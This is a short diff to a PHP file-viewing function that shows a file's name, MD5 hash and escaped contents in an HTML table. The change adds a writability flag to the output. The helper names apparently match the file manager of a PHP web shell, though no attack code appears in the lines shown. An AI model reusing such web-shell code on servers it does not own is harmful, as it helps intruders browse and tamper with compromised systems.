@@ -508,7 +508,7 @@ if(!function_exists('write_file')){
 
 if(!function_exists('view_file')){
 	function view_file($file, $type, $preserveTimestamp='true'){
-		$output = "";
+		$output = is_writable($file)?"true":"false";
 		if(is_file($file)){
 			$dir = get_cwd();
 
@@ -586,7 +586,7 @@ if(!function_exists('view_file')){
 			}
 			else $content = "<pre>".html_safe(read_file($file))."</pre>";
 
-			$output .= "
+			$output .= "|
 	<table id='viewFile' class='boxtbl'>
 	<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
     <tr><td>Hash</td><td>".md5_file($file)."</td></tr>
@@ -607,8 +607,6 @@ if(!function_exists('view_file')){
 	</td></tr>
 	<tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr>
 	</table>";
-
-
 		}
 		else $output = "error";
 		return $output;
